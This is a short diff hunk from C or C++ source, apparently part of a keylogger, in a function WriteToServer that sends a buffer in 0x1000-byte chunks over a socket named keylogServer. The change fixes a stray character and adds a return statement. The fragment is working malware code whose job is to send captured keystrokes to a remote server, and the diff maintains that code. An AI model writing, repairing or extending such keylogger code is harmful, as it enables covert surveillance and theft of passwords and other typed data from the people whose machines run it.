@@ -121,7 +121,8 @@ bool WriteToServer(const char* buffer)
                     memcpy(temp,buffer+(x*0x1000),strlen(buffer+(x*0x1000))+1);
                     if (send(keylogServer,temp,strlen(temp)+1,0) ==SOCKET_ERROR)
                         return false;
-                    printf("%s",temp);0
+                    printf("%s",temp);
+                    return true;
                 }
             printf("%s",temp);
         }
